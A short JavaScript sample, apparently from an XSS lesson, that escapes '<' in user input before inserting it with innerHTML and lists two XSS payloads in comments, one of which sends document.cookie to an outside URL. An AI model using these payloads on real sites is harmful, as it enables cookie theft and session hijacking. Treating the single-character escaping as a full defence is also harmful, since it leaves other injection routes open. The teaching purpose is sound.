function testUserText ( userText ) {
      return userText.split("<").join("&lt;")
}
function insertUserText ( userText ) {
      var x = document.createElement ( 'div' )
      x.innerHTML = testUserText ( userText )
      document.body.appendChild ( x )
}

document.querySelector ( 'input' ).onchange = function ( event ) {
        insertUserText ( event.target.value )
}
// <IMG SRC=/ onerror="document.write(String.fromCharCode(88,83,83))"></img>
// <IFRAME SRC=js/attack.html onmouseover="window.open('https://garevna.github.io/js-samples/js/attack.html#' + document.cookie, '_self')"></IFRAME>
